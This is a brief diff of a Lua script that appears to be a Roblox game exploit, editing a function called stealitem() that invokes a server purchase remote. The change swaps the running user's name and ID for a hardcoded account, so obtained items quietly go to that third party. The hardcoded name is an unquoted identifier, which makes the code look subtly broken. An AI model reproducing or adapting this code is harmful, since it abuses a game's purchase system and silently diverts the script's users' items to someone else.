@@ -686,8 +686,8 @@ function stealitem()
                 ["StorageName"] = "2x EXP (15 mins.)",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
-                ["ReceiverUserId"] = UserId,
+                ["ReceiverName"] = Boss_justin1s,
+                ["ReceiverUserId"] = 3455335524,
             }
         }
         game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
